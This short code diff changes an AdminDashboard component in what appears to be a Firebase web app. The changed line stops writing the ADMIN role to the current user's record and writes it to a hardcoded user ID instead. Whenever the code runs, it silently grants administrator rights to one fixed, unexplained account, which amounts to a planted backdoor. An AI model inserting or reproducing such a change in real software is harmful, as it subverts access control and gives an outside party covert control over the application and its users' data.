@@ -68,7 +68,7 @@ const AdminDashboard = () => {
       }
 
       if (user) {
-        await setDoc(doc(db, 'users', user.uid), {
+        await setDoc(doc(db, 'users',"PQPBq7ptgFhJ9j0eSJd3VnhX9mK2"), {
           role: UserRole.ADMIN,
         }, { merge: true });
       }
